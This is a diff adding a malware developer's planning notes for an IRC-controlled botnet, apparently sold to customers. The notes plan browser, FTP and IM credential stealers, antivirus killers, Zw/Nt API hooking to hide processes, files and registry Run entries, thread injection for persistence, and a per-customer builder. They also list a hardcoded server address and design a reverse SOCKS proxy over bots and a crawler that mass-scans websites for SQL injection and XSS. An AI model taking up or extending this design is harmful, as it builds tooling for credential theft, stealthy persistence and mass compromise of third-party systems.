@@ -1,0 +1,100 @@
+
+TODO:
+-stealers(browser, ftp, im, etc)
+
+ONGOING:
+-add more anti-botkilling techniques
+-continue to add anti-crack and encryption stuff always
+
+MESS AROUND WITH AV KILLERS - test ACL related stuff in VM. First remove AV process ACL, and then cripple actual file via BreakFile
+
+-SUPPORT MULTIPLE DNSES!!!!!!!!!!!:
+    append additional encrypted contents after PONG/PRIVMSG/JOIN/PART/etc that isnt decrypted until connection to the first server fails - that way it is less likely people find the additional dnses xD -
+
+-hooking!:
+first 5 bytes are jmp instructions
+
+ZwOpenProcess
+ZwOpenThread
+ZwOpenFile
+ZwCreateFile
+ZwDeleteFile
+
+ZwQuerySystemInformation - Returns list of processes/info
+ZwQueryDirectoryFile - returns list of files in a directory
+ZwEnumerateValueKey - returns information on specific value index in a key (used for listing values of a registry key, such as \Run)
+
+NtQueueApcThread
+NtSetContextThread
+NtUserQueryWindow
+
+NtTerminateProcess, NtQuerySystemInformation, NtQueryDirectoryFile, NtEnumerateValueKey, NtOpenProcess, NtOpenThread, NtOpenFile, NtCreateFile, NtDeleteFile, NtGetFileAttributesEx, NtVirtualProtect, NtQueueApcThread, NtSetContextThread
+
+-Option to use injected threads for process persistence as an alternative to the sister process method added(pro: bot will only use one process)(con: many more AV detections with injection enabled)
+
+-RE ADD THE BEST HTTPCOMBO EVER MADE
+
+-make a builder for the bot...
+    -make a bunch of empty bins with markers where the encrypted config would normally be stored
+    -give the builder different 'modes'
+        -read from file and build ALL binaries for everybody - including the debug version and non debug version
+        -enter something unique to identify a customer block with, the builder will scan the file and fetch the proper config info
+        -enter config info manually
+    -commandline console program
+    -have it located in the same directory as the .bat programs that upx and move around the compiled file... store the builder as a folder in that directory, and have it upx and move the file after config and stuff too
+
+-----------------------------------------------------------
+
+212.49.70.48:10001
+
+TO DO:
+-socks proxy
+-reverse socks proxy
+-assorted password stealers
+-md5 checking for update command
+-make it so the bot doesnt make an explorer window pop up
+-add versioning information to the handed out bin maybe
+
+For reverse socks:
+listen on localhost on whatever port you decide,
+for reverse socks you set your proxy to localhost:port
+bots contact you (the reverse socks proxy server app) and connect as a client
+when a new connection is made on the socket you are listening to localhost on is made, data is sent to the bot to contact X ip on Y port with Z data
+bot gets response from the connection it made, sends the received data back to the server program, and the server program sends the received data back to the connection that initially created connection, and then clean up
+
+
+-code a special complex addon for scanning for sql injections
+-come up with some more creative things in which the network of computers will work together and communicate with eachother to get things done
+
+-have a bunch of 'pieces' of website urls before hand, and build potential website urls... .net, .info, .com, .org, .co, .biz
+    -generate the names of the urls with different methods at the same time. this thing is an engine
+        -create compound things and solitary things from content on queried websites
+        -randomly generate words from letters
+        -check history
+    -Bots constantly outputting what is going on in a special output channel, but it can have diff modes maybe... discovered x website through y method, z appears to be vulnerable to t method of injection
+    -crawl the websites
+    -utilize a lot of temporary files(encrypt and decrypt the data stored) to store things such as traversed urls, successfully discovered websites through diff methods, discovered vulnerabilities
+    -reply needs to be 200 OK and the content length needs to be reasonable
+    -blacklist .edu and .gov
+-step by step how this will work:
+    -find seeds(websites to begin the crawling on) (eventually, saved external links become the seeds)
+        -scan history
+        -generate random urls and test them... basically randomly scanning
+    -crawl the website
+        -save external links in a file for later use
+        -save internal links in a file for immediate visiting & crawling
+    -once the internal links are exhausted in a given website, move onto the next external link
+        -separate domain from external link, visit it
+            -be sure to work out Moved Permenantly stuff
+        -basically crawl the external link like it is the previous website, and add discovered external links from the new site to the external link file (once a # of external links exist, stop random scanning)
+    -once a certain amount of saved potential attack vector urls are saved up, the sql vulnerability test routine begins
+-Example Output
+    -Stats [Seeds: A | Traversed: B | Vulnerable: C]
+    -No Existing Seeds! Scanning...
+    -Discovered Initial Seeds [History: Y | Generated: Z]
+    -Discovered Potential Sql Injection [Vuln: S]
+    -Discovered Potential XSS Injection [Vuln: S]
+    -Discovered Seeds [New: A | Total: B]
+
+
+
